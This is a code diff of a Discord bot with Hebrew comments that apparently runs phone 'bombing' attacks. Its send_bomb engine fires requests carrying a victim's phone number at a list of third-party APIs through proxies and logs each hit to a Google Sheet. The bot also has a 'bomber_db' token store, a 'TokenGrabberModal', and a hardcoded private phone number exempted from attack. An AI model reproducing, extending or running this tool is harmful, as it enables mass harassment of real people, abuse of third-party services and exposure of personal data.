@@ -6,6 +6,8 @@ import asyncio
 import random
 import os
 import logging
+import gspread
+from oauth2client.service_account import ServiceAccountCredentials
 from datetime import datetime
 from motor.motor_asyncio import AsyncIOMotorClient
 
@@ -14,7 +16,7 @@ TOKEN = os.getenv("BOT_TOKEN")
 GSHEET_URL = os.getenv("GSHEET_URL")
 MONGO_URI = os.getenv("MONGO_URI")
 
-# חיבור ל-MongoDB עם טיפול בשגיאות
+# חיבור ל-MongoDB
 db = None
 tokens_col = None
 allowed_numbers_col = None
@@ -25,10 +27,11 @@ if MONGO_URI:
         db = client.bomber_db
         tokens_col = db.tokens
         allowed_numbers_col = db.allowed_numbers
-        print("✅ Connected to MongoDB")
+        print("✅ MongoDB Connected")
     except Exception as e:
-        print(f"❌ MongoDB Connection Error: {e}")
+        print(f"❌ MongoDB Error: {e}")
 
+# ניהול עצירה בזמן אמת
 active_bombs = {}
 
 class MyBot(commands.Bot):
@@ -39,7 +42,7 @@ class MyBot(commands.Bot):
 
     async def setup_hook(self):
         await self.tree.sync()
-        print(f"✅ Bot Synced: /setup, /give, /allow-number")
+        print(f"✅ Commands Synced")
 
 bot = MyBot()
 
@@ -146,7 +149,7 @@ FULL_APIS = [
     {"name": "Telegram", "url": "https://api.telegram.org/botXXXXXX/sendMessage", "method": "POST", "params": {"phone": "{{phone}}"}}
 ]
 
-# ==================== LOGIC ====================
+# ==================== ENGINE ====================
 
 async def is_number_allowed(phone):
     if phone != "0535524017": return True
@@ -166,12 +169,14 @@ async def send_bomb(session, api, phone, sem, user_id):
             method = api.get("method", "POST").upper()
             async with session.request(method, api["url"], json=payload if payload else None, params=api.get("params"), timeout=10, proxy=proxy) as resp:
                 if GSHEET_URL:
-                    log_data = {"timestamp": datetime.now().strftime("%H:%M:%S"), "phone": phone, "api": api["name"], "status": str(resp.status), "success": "YES" if resp.status < 400 else "NO"}
-                    await session.post(GSHEET_URL, json=log_data, timeout=2)
+                    try:
+                        log_data = {"timestamp": datetime.now().strftime("%H:%M:%S"), "phone": phone, "api": api["name"], "status": str(resp.status), "success": "YES" if resp.status < 400 else "NO"}
+                        await session.post(GSHEET_URL, json=log_data, timeout=2)
+                    except: pass
                 return resp.status < 400
         except: return False
 
-# ==================== UI ELEMENTS ====================
+# ==================== UI ====================
 
 class TokenGrabberModal(discord.ui.Modal, title='🔑 לקיחת טוקן'):
     token_input = discord.ui.TextInput(label='הזן טוקן ללקיחה', style=discord.TextStyle.long)
